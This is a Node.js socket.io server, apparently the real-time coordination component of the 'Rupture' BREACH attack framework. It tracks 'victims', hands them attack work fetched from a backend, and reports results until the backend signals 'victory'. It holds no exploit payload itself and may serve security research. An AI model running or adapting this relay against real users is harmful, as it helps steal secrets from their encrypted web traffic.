const program = require('commander');

program
    .version('0.0.1')
    .option('-p, --port <port>', 'specify the websocket port to listen to [3031]', 3031)
    .option('-H, --backend-host <hostname>', 'specify the hostname of the HTTP backend service to connect to [localhost]', 'localhost')
    .option('-P, --backend-port <port>', 'specify the port of the HTTP backend service to connect to [8000]', 8000)
    .parse(process.argv);


const io = require('socket.io'),
      winston = require('winston'),
      http = require('http');

winston.level = 'debug';
winston.remove(winston.transports.Console);
winston.add(winston.transports.Console, {'timestamp': true});

const PORT = program.port;

winston.info('Rupture real-time service starting');
winston.info('Listening on port ' + PORT);

const socket = io.listen(PORT);
const victims = {};

const BACKEND_HOST = program.backendHost;
      BACKEND_PORT = program.backendPort;

winston.info('Backed by backend service running at ' + BACKEND_HOST + ':' + BACKEND_PORT);

socket.on('connection', (client) => {
    winston.info('New connection from client ' + client.id);

    let victimId;
    client.on('client-hello', (data) => {
        let victim_id;

        try {
            ({victim_id} = data);
        }
        catch (e) {
            winston.error('Got invalid client-hello message from client');
            return;
        }
        victimId = victim_id;

        if (!victims[victimId]) {
            victims[victimId] = client.id;
            client.emit('server-hello');
            winston.debug('Send server-hello message');
        }
        else {
            doNoWork();
            winston.debug('There is an other victimId <-> client.id match. Make client idle');
        }
    });

    const doNoWork = () => {
        winston.debug('Sending server-nowork to client ' + client.id);
        client.emit('server-nowork');
    };

    const createNewWork = () => {
        const getWorkOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            path: '/breach/get_work/' + victimId
        };

        winston.debug('Forwarding get_work request to backend URL ' + getWorkOptions.path);

        const getWorkRequest = http.request(getWorkOptions, (response) => {
            let responseData = '';
            response.on('data', (chunk) => {
                responseData += chunk;
            });
            response.on('end', () => {
                try {
                    client.emit('do-work', JSON.parse(responseData));
                    winston.info('Got (get-work) response from backend: ' + responseData);
                }
                catch (e) {
                    winston.error('Got invalid (get-work) response from backend');
                    doNoWork();
                }
            });
        });
        getWorkRequest.on('error', (err) => {
            winston.error('Caught getWorkRequest error: ' + err);
            doNoWork();
        });
        getWorkRequest.end();
    };

    const reportWorkCompleted = (work) => {
        const requestBodyString = JSON.stringify(work);

        const workCompletedOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': requestBodyString.length
            },
            path: '/breach/work_completed/' + victimId,
            method: 'POST',
        };

        const workCompletedRequest = http.request(workCompletedOptions, (response) => {
            let responseData = '';
            response.on('data', (chunk) => {
                responseData += chunk;
            });
            response.on('end', () => {
                try {
                    const victory = JSON.parse(responseData).victory;

                    winston.info('Got (work-completed) response from backend: ' + responseData);

                    if (victory === false) {
                        createNewWork();
                    }
                }
                catch (e) {
                    winston.error('Got invalid (work-completed) response from backend');
                    doNoWork();
                }
            });
        });
        workCompletedRequest.on('error', (err) => {
            winston.error('Caught workCompletedRequest error: ' + err);
            doNoWork();
        });
        workCompletedRequest.write(requestBodyString);
        workCompletedRequest.end();
    };

    client.on('get-work', () => {
        winston.info('get-work from client ' + client.id);
        createNewWork();
    });

    client.on('work-completed', (data) => {
        let work, success, host;

        try {
            ({work, success, host} = data);
        }
        catch (e) {
            winston.error('Got invalid work-completed from client');
            return;
        }

        winston.info('Client indicates work completed: ', work, success, host);

        const requestBody = work;
        requestBody.success = success;
        reportWorkCompleted(requestBody);
    });
    client.on('disconnect', () => {
        winston.info('Client ' + client.id + ' disconnected');

        // If this client was active, empty the spot of its victim
        for (let i in victims) {
            if (victims[i] == client.id) {
                delete victims[i];
            }
        }

        const requestBody = {
            success: false
        };
        reportWorkCompleted(requestBody);
    });
});
